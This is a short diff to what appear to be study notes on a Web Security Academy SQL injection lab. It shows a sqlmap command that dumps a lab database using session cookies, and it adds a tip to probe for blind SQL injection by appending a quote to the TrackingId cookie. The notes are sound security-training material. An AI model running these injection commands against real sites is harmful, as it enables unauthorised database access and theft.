@@ -24,6 +24,9 @@ if you know the db, put --dbms=postgresql or else run without --dbms flag, it ma
 while running below, it will ask for confirmations, go by default, just click enter.
 sqlmap -u 'https://0af800e604055c7d819e399800bf00c6.web-security-academy.net/filter?category=Lifestyle' --cookie='TrackingId=nDU4jKT9hjQE9mr5; session=PFERWY0rKpJ7bPszXsQKXVAnzmZyBLWq' --level 2 --dbms=postgresql --dump --threads=5
 
+checking for blind sql vulneabilities:
+Cookie: TrackingId=S0DitPIzii7Vv0TT'  --> put ' at the end of the cookies.
+ 
 
 ## Summary
 
